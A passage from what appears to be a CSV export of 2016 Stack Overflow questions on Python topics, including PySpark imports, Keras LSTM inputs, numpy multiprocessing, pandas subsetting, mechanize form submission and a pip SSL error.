 File ""/opt/spark/spark-2.0.0-bin-hadoop2.7/python/lib/pyspark.zip/pyspark/worker.py"", line 161, in main
   func, profiler, deserializer, serializer = read_command(pickleSer, infile)
 File ""/opt/spark/spark-2.0.0-bin-hadoop2.7/python/lib/pyspark.zip/pyspark/worker.py"", line 54, in read_command
   command = serializer._read_with_length(file)
 File ""/opt/spark/spark-2.0.0-bin-hadoop2.7/python/lib/pyspark.zip/pyspark/serializers.py"", line 164, in _read_with_length
   return self.loads(obj)
 File ""/opt/spark/spark-2.0.0-bin-hadoop2.7/python/lib/pyspark.zip/pyspark/serializers.py"", line 422, in loads
   return pickle.loads(obj)
 File ""/opt/spark/spark-2.0.0-bin-hadoop2.7/python/lib/pyspark.zip/pyspark/cloudpickle.py"", line 664, in subimport
   __import__(name)
ImportError: ('No module named caffe', &lt;function subimport at 0x7efc34a68b90&gt;, ('caffe',))
</code></pre>

<p>Does anyone know why this would be an issue?</p>

<p>This package from Yahoo manages what we're trying to do by shipping Caffe as a jar dependency and then uses it again in Python. But I haven't found any resources on how to build it and import it ourselves.</p>

<p><a href=""https://github.com/yahoo/CaffeOnSpark"">https://github.com/yahoo/CaffeOnSpark</a></p>
"
39674713,2151205.0,2016-09-24 09:21:49+00:00,8,Neural Network LSTM Keras multiple inputs,"<p>I am trying to implement an <a href=""https://keras.io/layers/recurrent/#lstm"">LSTM with Keras</a>. My inputs and outputs are like in a regression, that is, I have one timeseries y with T observations that I am trying to predict, and I have N (in my case around 20) input vectors (timeseries) of T observations each that I want to use as inputs.</p>

<p>I know that LSTM's in Keras require a <code>3D tensor with shape (nb_samples, timesteps, input_dim)</code> as an input. However, I am not entirely sure how the input should look like in my case, as I have just one sample of T observations for each input, not multiple samples, i.e. I think that would translate to <code>(nb_samples=1, timesteps=T, input_dim=N)</code>. However, is it better to split each of my inputs into samples of length T/M? T is around a few million observations for me, so how long should each sample in that case be, i.e., how would I choose M?</p>

<p>Also, am I right in that this tensor should look something like:</p>

<p><code>[[[a_11, a_12, ..., a_1M], [a_21, a_22, ..., a_2M], ..., [a_N1, a_N2, ..., a_NM]], [[b_11, b_12, ..., b_1M], [b_21, b_22, ..., b_2M], ..., [b_N1, b_N2, ..., b_NM]], ..., [[x_11, x_12, ..., a_1M], [x_21, x_22, ..., x_2M], ..., [x_N1, x_N2, ..., x_NM]]]</code>, where M and N defined as before and x corresponds to the last sample that I would have obtained from splitting as discussed above? </p>

<p>Given a pandas dataframe with T observations in each column, and N columns, one for each input, how can I create such an input to feed to Keras?</p>

<p>In addition, how should I choose the batch size? It seems that Keras only accepts batch sizes that are multiples of <code>nb_samples</code>? Also, when after I have fitted the model, it seems that I can only predict out-of-sample for inputs that are again of a length that is a multiple of the batch size? How does this work in practice?</p>

<p><strong>I would highly appreciate it if someone could show me a full worked example of an LSTM in Keras (and worst case in another python package, or if that's also not possible in another language) for a situation similar to the one I described: i.e. with one output timeseries and multiple input timeseries (just like in a regression), showing how to fit the model in-sample and then predict out-of-sample.</strong></p>

<p>Thanks very much in advance :)!</p>
"
39750879,3809375.0,2016-09-28 14:47:06+00:00,8,How to split text into chunks minimizing the solution?,"<p><strong>OVERVIEW</strong> </p>

<p>I got a set of possible valid chunks I can use to split a text (if possible).</p>

<p>How can i split a given text using these chunks such as the result will be optimized (minimized) in terms of the number of resulting chunks?</p>

<p><strong>TEST SUITE</strong></p>

<pre><code>if __name__ == ""__main__"":
    import random
    import sys

    random.seed(1)

    # 1) Testing robustness
    examples = []
    sys.stdout.write(""Testing correctness..."")
    N = 50
    large_number = ""3141592653589793238462643383279502884197169399375105820974944592307816406286208998628034825342117067982148086513282306647093844609550582231725359408128481""
    for i in range(100):
        for j in range(i):
            choices = random.sample(range(i), j)
            examples.append((choices, large_number))

    for (choices, large_number) in examples:
        get_it_done(choices, large_number)
    sys.stdout.write(""OK"")

    # 2) Testing correctness
    examples = [
        # Example1 -&gt;
        # Solution ['012345678910203040506070', '80', '90', '100', '200', '300', '400', '500', '600', '700', '800', '900']
        (
            [
                ""0"", ""1"", ""2"", ""3"", ""4"", ""5"", ""6"", ""7"", ""8"", ""9"",
                ""10"", ""20"", ""30"", ""40"", ""50"", ""60"", ""70"", ""80"", ""90"",
                ""100"", ""200"", ""300"", ""400"", ""500"", ""600"", ""700"", ""800"", ""900"",
                ""012345678910203040506070""
            ],
            ""0123456789102030405060708090100200300400500600700800900""
        ),
        # Example2
        ## Solution ['100']
        (
            [""0"", ""1"", ""10"", ""100""],
            ""100""
        ),
        # Example3
        ## Solution ['101234567891020304050', '6070809010020030040050', '0600700800900']
        (
            [
                ""10"", ""20"", ""30"", ""40"", ""50"", ""60"", ""70"", ""80"", ""90"",
                ""012345678910203040506070"",
                ""101234567891020304050"",
                ""6070809010020030040050"",
                ""0600700800900""
            ],
            ""10123456789102030405060708090100200300400500600700800900""
        ),
        # Example4
        ### Solution ['12', '34', '56', '78', '90']
        (
            [
                ""12"", ""34"", ""56"", ""78"", ""90"",
                ""890"",
            ],
            ""1234567890""
        ),
        # Example5
        ## Solution ['12', '34']
        (
            [
                ""1"", ""2"", ""3"",
                ""12"", ""23"", ""34""
            ],
            ""1234""
        ),
        # Example6
        ## Solution ['100', '10']
        (
            [""0"", ""1"", ""10"", ""100""],
            ""10010""
        )
    ]

    score = 0
    for (choices, large_number) in examples:
        res = get_it_done(choices, large_number)
        flag = """".join(res) == large_number
        print(""{0}\n{1}\n{2} --&gt; {3}"".format(
            large_number, """".join(res), res, flag))
        print('-' * 80)
        score += flag

    print(
        ""Score: {0}/{1} = {2:.2f}%"".format(score, len(examples), score / len(examples) * 100))

    # 3) TODO: Testing optimization, it should provide (if possible)
    #          minimal cases
</code></pre>

<p><strong>QUESTION</strong></p>

<p>How could I solve this problem on python without using a brute-force approach?</p>
"
39620547,1082019.0,2016-09-21 15:18:56+00:00,8,"Python, why is my probabilistic neural network (PNN) always predicting zeros?","<p>I'm working with Python 2.7.5 on Linux CentOS 7 machine.
I'm trying to apply a <strong>probabilistic neural network (PNN)</strong> my dataset, to solve a <strong>binary classification problem</strong>.</p>

<p>I'm using the following Python packages: numpy, sklearn, neupy.algorithms.
I'm trying to follow <a href=""https://github.com/itdxer/neupy/blob/master/examples/rbfn/pnn_iris.py"">this example used for the iris dataset</a>.</p>

<p>The issue is that my <strong>PNN always predicts zero values</strong> (elements classified as zeros), and I cannot understand why...</p>

<p>Here's my dataset (""dataset_file.csv""). There are 34 features and 1 label target (the last column, that might be 0 or 1):</p>

<pre><code>47,1,0,1,0,20,1,0,1,24,1,1,0,2,1,8050,9,1,274,60,258,65,7,3.2,105,289,0,0,79,1,0,0,0,34,0
55,1,0,1,0,45,1,0,0,1,1,1,1,3,0,11200,7,0,615,86,531,97,5.4,2.6,96,7541,1.6,0.8,6,1,1,1,1,42,0
29,1,1,1,0,23,0,1,0,1,0,0,0,2,1,5300,12,1,189,30,203,72,7,3.5,93,480,0,0,90,1,0,0,0,43,1
39,1,0,1,0,10,1,0,0,3,0,1,1,0,1,7910,14,1,462,28,197,50,8,4.5,93,459,5,2.8,45,1,1,0,0,21,0
47,1,0,1,0,10,1,1,1,1.5,1,1,0,3,1,9120,4,0,530,71,181,60,6.2,3.8,83,213,3.6,1.95,53,1,1,0,0,11,0
57,1,0,1,0,50,0,1,0,24,1,0,1,3,1,16000,9,0,330,78,172,74,5.9,2.9,112,332,4.1,2.1,82,1,1,0,0,23,1
44,1,0,1,0,15,1,1,0,0.5,1,1,1,2,0,5800,14,0,275,44,155,105,7.2,3.5,84,360,3.44,1.6,55,1,1,0,0,24,0
49,1,3,1,0,25,1,1,1,1,0,1,0,3,1,8200,12,1,441,74,237,111,6.2,3.6,79,211,0,0,91,1,0,0,0,43,0
56,1,0,1,0,5,1,0,0,3,1,0,0,3,1,5100,7,1,188,58,185,62,7.8,3.9,112,472,0,0,83,1,0,0,0,34,0
33,1,4,1,0,20,1,0,1,3,0,0,0,3,1,7300,10,1,329,40,139,80,6.9,3.7,89,122,3.4,1.2,75,1,1,0,0,33,0
22,0,0,1,0,15,1,0,0,1,1,1,1,0,1,3700,8,0,617,53,267,128,6.2,3.8,91,3060,3.1,1.9,63,1,1,0,0,54,0
82,0,5,1,0,60,1,0,1,3,1,1,1,0,0,8900,11,1,275,83,255,93,5.9,3.1,95,455,4.8,1.9,68,1,1,0,0,55,0
49,0,2,1,0,20,1,0,1,2,1,0,0,0,1,8500,6,1,292,84,241,79,6.8,3.9,100,158,3.4,1.25,75,1,1,1,0,65,0
51,1,4,1,0,51,1,1,1,2,1,0,1,0,1,18300,14,1,522,91,268,105,6.1,3.1,98,758,4.2,2.5,19,1,1,1,1,67,0
61,1,2,1,0,20,1,0,0,3,1,0,0,3,1,6600,9,1,563,101,268,78,6.4,3.7,115,694,5.2,3,29,1,1,1,1,77,0
48,0,1,1,0,28,1,0,0,12,1,0,0,3,1,9100,22,0,114,18,165,63,7.2,3.6,103,429,0,0,84,1,0,0,0,34,0
57,0,0,1,0,40,1,0,1,1,0,0,0,3,1,8100,8,0,264,15,120,69,6.8,3.4,91,390,0,0,91,1,0,0,0,23,0
57,0,0,1,0,25,1,0,0,12,0,1,0,0,0,6900,16,0,847,111,289,78,5.3,2.4,105,162,3.1,1.9,68,1,1,1,0,78,0
47,1,4,1,0,40,0,1,1,6,1,1,1,2,1,21500,10,0,632,121,219,108,7.5,2.8,149,1158,3.17,1.77,8,1,1,1,0,58,1
52,0,0,1,0,30,1,1,1,2,1,0,1,0,0,14600,5,1,405,88,280,140,5.8,3.1,121,983,3.9,1.8,17,1,1,1,1,76,0
50,1,2,1,0,16,1,1,0,1,1,1,1,0,1,12200,9,1,280,7,176,71,7.4,4.2,105,293,4.5,2.7,68,1,1,0,0,67,0
63,1,4,1,0,18,1,0,1,0.5,1,1,1,3,0,16400,8,0,479,93,140,64,5.8,3.7,226,1286,6.22,3.6,18,1,1,0,0,19,0
54,0,0,1,0,20,0,0,1,8,0,0,1,0,1,7200,10,0,366,71,284,73,6.4,3.7,114,384,4.1,2.8,65,1,1,0,0,24,1
31,0,3,1,0,10,0,1,0,1,1,1,1,1,1,3800,8,0,568,102,236,59,6.4,3.7,99,387,0,0,78,1,0,0,0,45,1
44,0,6,1,0,10,1,1,0,2,1,1,1,0,1,7700,15,1,274,44,139,62,6.7,4.1,93,129,0,0,76,1,0,0,0,24,0
50,0,6,1,0,20,1,0,0,3,1,1,0,0,1,5200,6,0,403,90,224,79,6.3,3.1,109,151,3.1,1.4,79,1,0,0,0,34,0
61,1,3,1,0,30,0,1,0,3,1,0,1,2,1,11500,7,0,668,88,178,65,6.7,3.08,104,680,4.1,2.5,22,1,1,0,0,23,1
</code></pre>

<p>And here's my Python code:</p>

<pre><code>import numpy as np
from sklearn import datasets
from sklearn.metrics import matthews_corrcoef
from sklearn.cross_validation import StratifiedKFold

from neupy.algorithms import PNN

fileName=""dataset_file.csv""
TARGET_COLUMN=35

from numpy import genfromtxt
input_dataset_data = genfromtxt(fileName, delimiter=',', skip_header=0, usecols=(range(0, TARGET_COLUMN-1)))
#print(input_dataset_data)
input_dataset_target = genfromtxt(fileName, delimiter=',', skip_header=0, usecols=(TARGET_COLUMN-1))
#print(input_dataset_target)

kfold_number = 2
skfold = StratifiedKFold(input_dataset_target, kfold_number, shuffle=True)
avarage_result = 0

print(""&gt; Start classify input_dataset dataset"")

for i, (train, test) in enumerate(skfold, start=1):

    pnn_network = PNN(std=0.1, step=0.2, verbose=True)

    pnn_network.train(input_dataset_data[train], input_dataset_target[train])
    predictions = pnn_network.predict(input_dataset_data[test])

    print(predictions)
    #print(input_dataset_target[test])

    mcc = matthews_corrcoef(input_dataset_target[test], predictions)
    print ""The Matthews correlation coefficient is %f"" % mcc

    print(""kfold #{:&lt;2}: Guessed {} out of {}"".format(
        i, np.sum(predictions == input_dataset_target[test]), test.size
    ))
</code></pre>

<p>Does anyone know <strong>why</strong> I am getting only predictions having 0 value?
Can you give me some <strong>suggestion</strong> to solve this issue?</p>

<p>Thanks!</p>

<p>EDIT: Here's the normalized dataset (normalized by column):</p>

<pre><code>0.55,1,0,1,0,0.29,1,0,1,0.46,1,1,0,0.67,1,0.37,0.41,1,0.08,0.47,0.23,0.13,0.82,0.46,0.25,0.04,0,0,0.52,1,0,0,0,0.33,0
0.65,1,0,1,0,0.64,1,0,0,0.02,1,1,1,1,0,0.52,0.32,0,0.18,0.67,0.47,0.2,0.64,0.38,0.23,1,0.24,0.18,0.04,1,1,1,1,0.41,0
0.34,1,0.13,1,0,0.33,0,0.5,0,0.02,0,0,0,0.67,1,0.25,0.55,1,0.06,0.23,0.18,0.15,0.82,0.51,0.22,0.06,0,0,0.6,1,0,0,0,0.42,1
0.46,1,0,1,0,0.14,1,0,0,0.06,0,1,1,0,1,0.37,0.64,1,0.14,0.22,0.17,0.1,0.94,0.65,0.22,0.06,0.75,0.64,0.3,1,1,0,0,0.2,0
0.55,1,0,1,0,0.14,1,0.5,1,0.03,1,1,0,1,1,0.42,0.18,0,0.16,0.55,0.16,0.12,0.73,0.55,0.2,0.03,0.54,0.44,0.35,1,1,0,0,0.11,0
0.67,1,0,1,0,0.71,0,0.5,0,0.46,1,0,1,1,1,0.74,0.41,0,0.1,0.6,0.15,0.15,0.69,0.42,0.27,0.04,0.61,0.48,0.54,1,1,0,0,0.22,1
0.52,1,0,1,0,0.21,1,0.5,0,0.01,1,1,1,0.67,0,0.27,0.64,0,0.08,0.34,0.14,0.21,0.85,0.51,0.2,0.05,0.51,0.36,0.36,1,1,0,0,0.23,0
0.58,1,0.38,1,0,0.36,1,0.5,1,0.02,0,1,0,1,1,0.38,0.55,1,0.13,0.57,0.21,0.23,0.73,0.52,0.19,0.03,0,0,0.6,1,0,0,0,0.42,0
0.66,1,0,1,0,0.07,1,0,0,0.06,1,0,0,1,1,0.24,0.32,1,0.06,0.45,0.16,0.13,0.92,0.57,0.27,0.06,0,0,0.55,1,0,0,0,0.33,0
0.39,1,0.5,1,0,0.29,1,0,1,0.06,0,0,0,1,1,0.34,0.45,1,0.1,0.31,0.12,0.16,0.81,0.54,0.21,0.02,0.51,0.27,0.5,1,1,0,0,0.32,0
0.26,0,0,1,0,0.21,1,0,0,0.02,1,1,1,0,1,0.17,0.36,0,0.19,0.41,0.24,0.26,0.73,0.55,0.22,0.41,0.46,0.43,0.42,1,1,0,0,0.52,0
0.96,0,0.63,1,0,0.86,1,0,1,0.06,1,1,1,0,0,0.41,0.5,1,0.08,0.64,0.23,0.19,0.69,0.45,0.23,0.06,0.72,0.43,0.45,1,1,0,0,0.53,0
0.58,0,0.25,1,0,0.29,1,0,1,0.04,1,0,0,0,1,0.4,0.27,1,0.09,0.65,0.21,0.16,0.8,0.57,0.24,0.02,0.51,0.28,0.5,1,1,1,0,0.63,0
0.6,1,0.5,1,0,0.73,1,0.5,1,0.04,1,0,1,0,1,0.85,0.64,1,0.16,0.71,0.24,0.21,0.72,0.45,0.23,0.1,0.63,0.57,0.13,1,1,1,1,0.65,0
0.72,1,0.25,1,0,0.29,1,0,0,0.06,1,0,0,1,1,0.31,0.41,1,0.17,0.78,0.24,0.16,0.75,0.54,0.27,0.09,0.78,0.68,0.19,1,1,1,1,0.75,0
0.56,0,0.13,1,0,0.4,1,0,0,0.23,1,0,0,1,1,0.42,1,0,0.03,0.14,0.15,0.13,0.85,0.52,0.24,0.06,0,0,0.56,1,0,0,0,0.33,0
0.67,0,0,1,0,0.57,1,0,1,0.02,0,0,0,1,1,0.38,0.36,0,0.08,0.12,0.11,0.14,0.8,0.49,0.22,0.05,0,0,0.6,1,0,0,0,0.22,0
0.67,0,0,1,0,0.36,1,0,0,0.23,0,1,0,0,0,0.32,0.73,0,0.25,0.86,0.26,0.16,0.62,0.35,0.25,0.02,0.46,0.43,0.45,1,1,1,0,0.76,0
0.55,1,0.5,1,0,0.57,0,0.5,1,0.12,1,1,1,0.67,1,1,0.45,0,0.19,0.94,0.19,0.22,0.88,0.41,0.35,0.15,0.47,0.4,0.05,1,1,1,0,0.56,1
0.61,0,0,1,0,0.43,1,0.5,1,0.04,1,0,1,0,0,0.68,0.23,1,0.12,0.68,0.25,0.29,0.68,0.45,0.29,0.13,0.58,0.41,0.11,1,1,1,1,0.74,0
0.59,1,0.25,1,0,0.23,1,0.5,0,0.02,1,1,1,0,1,0.57,0.41,1,0.08,0.05,0.16,0.15,0.87,0.61,0.25,0.04,0.67,0.61,0.45,1,1,0,0,0.65,0
0.74,1,0.5,1,0,0.26,1,0,1,0.01,1,1,1,1,0,0.76,0.36,0,0.14,0.72,0.12,0.13,0.68,0.54,0.54,0.17,0.93,0.82,0.12,1,1,0,0,0.18,0
0.64,0,0,1,0,0.29,0,0,1,0.15,0,0,1,0,1,0.33,0.45,0,0.11,0.55,0.25,0.15,0.75,0.54,0.27,0.05,0.61,0.64,0.43,1,1,0,0,0.23,1
0.36,0,0.38,1,0,0.14,0,0.5,0,0.02,1,1,1,0.33,1,0.18,0.36,0,0.17,0.79,0.21,0.12,0.75,0.54,0.24,0.05,0,0,0.52,1,0,0,0,0.44,1
0.52,0,0.75,1,0,0.14,1,0.5,0,0.04,1,1,1,0,1,0.36,0.68,1,0.08,0.34,0.12,0.13,0.79,0.59,0.22,0.02,0,0,0.5,1,0,0,0,0.23,0
0.59,0,0.75,1,0,0.29,1,0,0,0.06,1,1,0,0,1,0.24,0.27,0,0.12,0.7,0.2,0.16,0.74,0.45,0.26,0.02,0.46,0.32,0.52,1,0,0,0,0.33,0
0.72,1,0.38,1,0,0.43,0,0.5,0,0.06,1,0,1,0.67,1,0.53,0.32,0,0.2,0.68,0.16,0.13,0.79,0.45,0.25,0.09,0.61,0.57,0.15,1,1,0,0,0.22,1
</code></pre>
"
39844473,6217203.0,2016-10-04 05:01:53+00:00,8,Find the subset of a set of integers that has the maximum product,"<p>Let A be a non-empty set of integers. Write a function <strong>find</strong> that outputs a non-empty subset of A that has the maximum product. For example, <strong>find([-1, -2, -3, 0, 2]) = 12 = (-2)*(-3)*2</strong></p>

<p>Here's what I think: divide the list into a list of positive integers and a list of negative integers:</p>

<ol>
<li>If we have an even number of negative integers, multiply everything in both list and we have the answer. </li>
<li>If we have an odd number of negative integers, find the largest and remove it from the list. Then multiply everything in both lists. </li>
<li>If the list has only one element, return this element.</li>
</ol>

<p>Here's my code in Python:</p>

<pre><code>def find(xs):
    neg_int = []
    pos_int = []
    if len(xs) == 1:
        return str(xs[0])
    for i in xs:
        if i &lt; 0:
            neg_int.append(i)
        elif i &gt; 0:
            pos_int.append(i)
    if len(neg_int) == 1 and len(pos_int) == 0 and 0 in xs:
        return str(0)
    if len(neg_int) == len(pos_int) == 0:
        return str(0)
    max = 1
    if len(pos_int) &gt; 0:
        for x in pos_int:
            max=x*max
    if len(neg_int) % 2 == 1:
        max_neg = neg_int[0]
        for j in neg_int:
            if j &gt; max_neg:
                max_neg = j
        neg_int.remove(max_neg)
    for k in neg_int:
        max = k*max
    return str(max)
</code></pre>

<p>Am I missing anything? P.S. This is a problem from Google's foobar challenge, I am apparently missing one case but I don't know which.</p>

<p>Now here's actual problem:
<a href=""http://i.stack.imgur.com/zAw0f.png""><img src=""http://i.stack.imgur.com/zAw0f.png"" alt=""enter image description here""></a></p>
"
39611045,1372149.0,2016-09-21 08:16:21+00:00,8,Use multi-processing/threading to break numpy array operation into chunks,"<p>I have a function defined which renders a MxN array. 
The array is very huge hence I want to use the function to produce small arrays (M1xN, M2xN, M3xN --- MixN. M1+M2+M3+---+Mi = M)  simultaneously using multi-processing/threading and eventually join these arrays to form mxn array. As Mr. Boardrider rightfully suggested to provide a viable example, following example would broadly convey what I intend to do </p>

<pre><code>import numpy as n
def mult(y,x):
    r = n.empty([len(y),len(x)])
    for i in range(len(r)):
        r[i] = y[i]*x
    return r
x = n.random.rand(10000)
y = n.arange(0,100000,1)
test = mult(y=y,x=x)
</code></pre>

<p>As the lengths of <code>x</code> and <code>y</code> increase the system will take more and more time. With respect to this example, I want to run this code such that if I have 4 cores, I can give quarter of the job to each, i.e give job to compute elements <code>r[0]</code> to <code>r[24999]</code> to the 1st core, <code>r[25000]</code> to <code>r[49999]</code> to the 2nd core, <code>r[50000]</code> to <code>r[74999]</code> to the 3rd core and <code>r[75000]</code> to <code>r[99999]</code> to the 4th core. Eventually club the results, append them to get one single array <code>r[0]</code> to <code>r[99999]</code>. </p>

<p>I hope this example makes things clear. If my problem is still not clear, please tell.</p>
"
39877725,1475412.0,2016-10-05 15:09:24+00:00,8,Does it make sense to use cross-correlation on arrays of timestamps?,"<p>I want to find the offset between two arrays of timestamps. They could represent, let's say, the onset of beeps in two audio tracks.</p>

<p><strong>Note</strong>: There may be extra or missing onsets in either track.</p>

<p>I found some information about cross-correlation (e.g. <a href=""https://dsp.stackexchange.com/questions/736/how-do-i-implement-cross-correlation-to-prove-two-audio-files-are-similar"">https://dsp.stackexchange.com/questions/736/how-do-i-implement-cross-correlation-to-prove-two-audio-files-are-similar</a>) which looked promising.</p>

<p>I assumed that each audio track is 10 seconds in duration, and represented the beep onsets as the peaks of a ""square wave"" with a sample rate of 44.1 kHz:</p>

<pre><code>import numpy as np

rfft = np.fft.rfft
irfft = np.fft.irfft

track_1 = np.array([..., 5.2, 5.5, 7.0, ...])
# The onset in track_2 at 8.0 is ""extra,"" it has no
# corresponding onset in track_1
track_2 = np.array([..., 7.2, 7.45, 8.0, 9.0, ...])
frequency = 44100
num_samples = 10 * frequency
wave_1 = np.zeros(num_samples)
wave_1[(track_1 * frequency).astype(int)] = 1
wave_2 = np.zeros(num_samples)
wave_2[(track_2 * frequency).astype(int)] = 1
xcor = irfft(rfft(wave_1) * np.conj(rfft(wave_2)))
offset = xcor.argmax()
</code></pre>

<p>This approach isn't particularly fast, but I was able to get fairly consistent results even with quite low frequencies. However... I have no idea if this is a good idea! Is there a better way to find this offset than cross-correlation?</p>

<p><strong>Edit</strong>: added note about missing and extra onsets.</p>
"
39716492,5656742.0,2016-09-27 05:18:07+00:00,8,The Pythonic way to grow a list of lists,"<p>I have a large file (2GB) of categorical data (mostly ""Nan""--but populated here and there with actual values) that is too large to read into a single data frame.  I had a rather difficult time coming up with a object to store all the unique values for each column (Which is my goal--eventually I need to factorize this for modeling)</p>

<p>What I ended it up doing was reading the file in chunks into a dataframe and then get the unique values of each column and store them in a list of lists.  My solution works, but seemed most un-pythonic--is there a cleaner way to accomplish this in Python (ver 3.5).  I do know the number of columns (~2100).</p>

<pre><code>import pandas as pd
#large file of csv separated text data
data=pd.read_csv(""./myratherlargefile.csv"",chunksize=100000, dtype=str)

collist=[]
master=[]
i=0
initialize=0
for chunk in data:
    #so the first time through I have to make the ""master"" list
    if initialize==0:
        for col in chunk:
            #thinking about this, i should have just dropped this col
            if col=='Id':
                continue
            else:
                #use pd.unique as a build in solution to get unique values
                collist=chunk[col][chunk[col].notnull()].unique().tolist()
                master.append(collist)
                i=i+1
    #but after first loop just append to the master-list at
    #each master-list element
    if initialize==1:
        for col in chunk:
            if col=='Id':
                continue
            else:
                collist=chunk[col][chunk[col].notnull()].unique().tolist()
                for item in collist:
                    master[i]=master[i]+collist
                i=i+1
    initialize=1
    i=0 
</code></pre>

<p>after that, my final task for all the unique values is as follows:</p>

<pre><code>i=0
names=chunk.columns.tolist()
for item in master:
     master[i]=list(set(item))
     master[i]=master[i].append(names[i+1])
     i=i+1
</code></pre>

<p>thus master[i] gives me the column name and then a list of unique values--crude but it does work--my main concern is building the list in a ""better"" way if possible.</p>
"
40111730,2907948.0,2016-10-18 15:01:30+00:00,7,How to use a dict to subset a DataFrame?,"<p>Say, I have given a DataFrame with most of the columns being categorical data.</p>

<pre><code>&gt; data.head()
  age risk     sex smoking
0  28   no    male      no
1  58   no  female      no
2  27   no    male     yes
3  26   no    male      no
4  29  yes  female     yes
</code></pre>

<p>And I would like to subset this data by a dict of key-value pairs for those categorical variables.</p>

<pre><code>tmp = {'risk':'no', 'smoking':'yes', 'sex':'female'}
</code></pre>

<p>Hence, I would like to have the following subset.</p>

<pre><code>data[ (data.risk == 'no') &amp; (data.smoking == 'yes') &amp; (data.sex == 'female')]
</code></pre>

<p>What I want to do is:</p>

<pre><code>data[tmp]
</code></pre>

<p>What is the most python / pandas way of doing this?</p>

<hr>

<p>Minimal example:</p>

<pre><code>import numpy as np
import pandas as pd
from pandas import Series, DataFrame

x = Series(random.randint(0,2,50), dtype='category')
x.cat.categories = ['no', 'yes']

y = Series(random.randint(0,2,50), dtype='category')
y.cat.categories = ['no', 'yes']

z = Series(random.randint(0,2,50), dtype='category')
z.cat.categories = ['male', 'female']

a = Series(random.randint(20,60,50), dtype='category')

data = DataFrame({'risk':x, 'smoking':y, 'sex':z, 'age':a})

tmp = {'risk':'no', 'smoking':'yes', 'sex':'female'}
</code></pre>
"
39805391,2955896.0,2016-10-01 10:15:06+00:00,7,selecting correct form while iterating all forms,"<p>I want to submit forms in multiple websites with mechanize. Usually I can't exactly know the form name or form id, but I know the input name that I want to submit.</p>

<p>Let's say there is a website which has couple of forms inside it. My code should check all of the forms, if one of them has a input value named ""email"" it will submit that form. If multiple forms has it, it will submit them all.</p>

<p>The website which I'm testing has two forms. One of them is login form, the other is subscribe form. Both of them has ""email"" input value. So my code should submit both forms.</p>

<p>I'm trying to achieve it with this code block:</p>

<pre><code>for forms in br.forms():
                if not forms.find_control(name=""email""):
                    continue
                br.select_form(nr=0)        
                br.form[""email""] = email
                br.submit()
                print ""Success: "", link
</code></pre>

<p>This code prints two success messages, however it's not subscribes. Following code works with submitting subscription form because I set the form name:</p>

<pre><code>br = mechanize.Browser()
br.set_handle_robots(False)
br.addheaders = [('User-agent', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6')]
br.open(""http://example.com"")
br.select_form(""subscribe"")
br.form[""email""] = email
br.submit()
</code></pre>

<p>So what's wrong with the first code? How can I select both forms and submit the value? Probably the problem is with that form selection part:</p>

<pre><code>br.select_form(nr=0)
</code></pre>

<p>Edit: I checked it's POST requests with Wireshark. It seems it fills the first form for 2 times. When I change <code>nr=0</code> with <code>nr=1</code> it works because the correct form is the second form.</p>
"
39896985,2112259.0,2016-10-06 13:12:17+00:00,7,Simple MLP time series training yields unexpeced mean line results,"<p>I'm trying to play around with simple time series predictions. Given number of inputs (1Min ticks) Net should attempt to predict next one. I've trained 3 nets with different settings to illustrate my problem:</p>

<p><a href=""http://i.stack.imgur.com/F2JAw.jpg"" rel=""nofollow""><img src=""http://i.stack.imgur.com/F2JAw.jpg"" alt=""enter image description here""></a></p>

<p>On the right you can see 3 trainer MLP's - randomly named and color coded, with some training stats. On the left - plot of predictions made by those nets and actual validation data in white. This plot was made by going through each tick of validation data (white), feeding 30|4|60 (Nancy|Kathy|Wayne) previous ticks to net and plotting what it will predict on place of current tick.</p>

<p>Multilayer perceptron's settings (Nancy|Kathy|Wayne settings):</p>

<p>Geometry: 2x30|4|60 input nodes -> 30|4|60 hidden layer nodes -> 2 outputs<br>
Number of epochs: 10|5|10<br>
Learning rate: 0.01<br>
Momentum: 0.5|0.9|0.5<br>
Nonlinearity: Rectify<br>
Loss: Squared Error  </p>

<p>It seems that with more training applied - predictions are converging in to some kind of mean line, which is not what I was expecting at all. I was expecting predictions to stand somewhat close to validation data with some margin of error.<br>
Am I picking wrong model, misunderstanding some core concepts of machine learning or doing something wrong in lasagne/theano?</p>

<p>Quick links to most relevant (in my opinion) code parts:  </p>

<ul>
<li><a href=""https://gist.github.com/anonymous/198b260ed50195e1cf2b63ad3501cafd#file-neurobot-py-L57-L66"" rel=""nofollow"">MLP Geometry definition</a></li>
<li><a href=""https://gist.github.com/anonymous/198b260ed50195e1cf2b63ad3501cafd#file-neurobot-py-L69-L103"" rel=""nofollow"">Functions compilation</a></li>
<li><a href=""https://gist.github.com/anonymous/198b260ed50195e1cf2b63ad3501cafd#file-neurobot-py-L125-L210"" rel=""nofollow"">Training and validation</a></li>
<li><a href=""https://gist.github.com/anonymous/198b260ed50195e1cf2b63ad3501cafd#file-guimodule-py-L1-L13"" rel=""nofollow"">Instantiating MLP</a></li>
<li><a href=""https://gist.github.com/anonymous/198b260ed50195e1cf2b63ad3501cafd#file-csvparser-py-L20-L60"" rel=""nofollow"">CSV training data parsing</a></li>
</ul>

<p>And here's full, more or less, sources:    </p>

<ul>
<li><a href=""https://gist.github.com/anonymous/077206b76b38d9dc30a751de2908cf23"" rel=""nofollow"">Data used for training</a> in format - date;open;high;low;close;volume - only date, high and low are used  </li>
<li><a href=""https://gist.github.com/anonymous/198b260ed50195e1cf2b63ad3501cafd#file-neurobot-py"" rel=""nofollow"">MLP module</a> </li>
<li>Gui module's relevant <a href=""https://gist.github.com/anonymous/198b260ed50195e1cf2b63ad3501cafd#file-guimodule-py"" rel=""nofollow"">MLP interaction parts</a>  </li>
</ul>
"
39935335,4709298.0,2016-10-08 17:34:30+00:00,7,pip install bs4 giving _socketobject error,"<p>I am trying to install BeautifulSoup4 using the command <code>pip install BeautifulSoup4</code>, as per the bs documentation here:</p>

<p><a href=""https://www.crummy.com/software/BeautifulSoup/#Download"">https://www.crummy.com/software/BeautifulSoup/#Download</a></p>

<p>I am using Mac OS X 10.7.5, and python 2.7.12</p>

<p>When I run the command in Terminal I get the error:</p>

<pre><code>AttributeError: '_socketobject' object has no attribute 'set_tlsext_host_name'
</code></pre>

<p>Can anyone suggest what I'm doing wrong?  Thanks in advance.</p>

<p>EDIT:
In light of comments I have tried to run <code>sudo pip install pyopenssl</code> however I get the same 'socketobject' error.</p>
"
39618648,3585386.0,2016-09-21 13:55:39+00:00,7,"Impute missing data, while forcing correlation coefficient to remain the same","<p>Consider the following (excel) dataset:</p>

<pre><code>m   |   r
----|------
2.0 | 3.3
